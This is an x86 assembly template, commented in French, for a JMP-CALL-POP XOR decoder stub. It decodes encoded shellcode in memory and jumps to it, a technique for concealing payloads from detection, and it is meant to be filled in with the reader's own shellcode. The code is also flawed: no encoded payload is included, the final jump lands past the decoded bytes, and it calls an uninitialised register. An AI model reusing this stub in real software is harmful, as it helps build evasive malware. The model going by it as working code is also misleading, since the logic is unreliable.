BITS 32

section .text
global _start

%define shellcode_length 32     ; adapte cette valeur à ton shellcode
%define key 0xAA                ; ta clé XOR

_start:
    jmp short get_shellcode

decode_loop:
    pop esi                     ; ESI pointe sur le shellcode encodé
    xor ecx, ecx
    mov cl, shellcode_length
    mov bl, key

decode_next:
    xor byte [esi], bl          ; décode le byte
    inc esi
    loop decode_next

    ; Appelle le callback (adresse dans EDX par exemple)
    call edx

    ; Saut au shellcode décodé
    jmp esi

get_shellcode:
    call decode_loop
